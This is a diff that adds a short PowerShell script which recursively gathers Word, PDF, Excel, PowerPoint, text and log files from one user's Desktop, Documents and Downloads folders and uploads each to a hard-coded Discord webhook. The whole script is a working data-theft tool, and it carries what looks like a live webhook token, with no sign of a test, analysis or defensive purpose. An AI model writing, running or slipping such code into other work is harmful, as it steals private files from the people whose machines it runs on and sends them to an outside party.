@@ -1,0 +1,29 @@
+$files = Get-ChildItem C:\Users\ICTHUBB\Desktop ,C:\Users\ICTHUBB\Documents, C:\Users\ICTHUBB\Downloads -recurse -include *.docx, *.pdf, *.doc,*.xlsx,*.pub,.*xls,*.ppt,*.txt,*.log
+foreach ($filepath in $files) {
+    $url = "https://discord.com/api/webhooks/983689296412286976/vvSY4ozrjd0WzTCqWjPA0kb8spi6dA_FMr8thKnRS9zemNTzkjulXFHXSyFGUzbqubvc"
+    $fieldName = 'file.pdf'
+
+    Try {
+        Add-Type -AssemblyName 'System.Net.Http'
+    
+        $client = New-Object System.Net.Http.HttpClient
+        $content = New-Object System.Net.Http.MultipartFormDataContent
+        $fileStream = [System.IO.File]::OpenRead($filePath)
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $content.Add($fileContent, $fieldName, $fileName)
+    
+        $result = $client.PostAsync($url, $content).Result
+        $result.EnsureSuccessStatusCode()
+    }
+    Catch {
+        Write-Error $_
+        continue;
+    }
+    Finally {
+        if ($client -ne $null) { $client.Dispose() }
+        if ($content -ne $null) { $content.Dispose() }
+        if ($fileStream -ne $null) { $fileStream.Dispose() }
+        if ($fileContent -ne $null) { $fileContent.Dispose() }
+    }
+    }
